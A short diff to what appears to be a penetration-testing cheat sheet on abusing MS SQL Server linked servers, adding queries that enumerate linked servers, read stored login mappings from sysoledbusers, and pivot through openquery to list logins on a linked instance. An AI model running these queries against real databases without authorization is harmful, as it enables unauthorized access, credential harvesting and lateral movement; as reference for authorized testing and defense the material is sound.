@@ -922,13 +922,17 @@ Scenario: we add our db account into a high privileged role...privesc
 
 * Manual checks
 ----------------
-	SQL> SELECT * from sysoledbusers;			//Contains one row for each user and password mapping for the specified linked server
+	SQL> SELECT * from master..sysservers;		//Enumerate linked databases 
+	SQL> SELECT * from sysoledbusers;		//Contains one row for each user and password mapping for the specified linked server (need admin priv)
 
 * Manual attack
 ----------------
 	SQL> SELECT * FROM [LinkedServer].[Database].[Schema].[ObjectName];
-	SQL> SELECT * FROM [SQLSRVPROD01\INTANCE01].Database_name.Schema_name.Table_name;
-
+	SQL> SELECT * FROM [SQLSRVPROD01\INSTANCE01].Database_name.Schema_name.Table_name;
+	
+	SQL> SELECT * FROM openquery("DB-Linked-Instance",'select * from master..sysservers');
+	SQL> SELECT * FROM openquery("DB-Linked-Instance",'select * from master..syslogin');
+	
 
 * Automatic checks and attacks with METASPLOIT - 'mssql_linkcrawler' module
 ----------------------------------------------------------------------------------
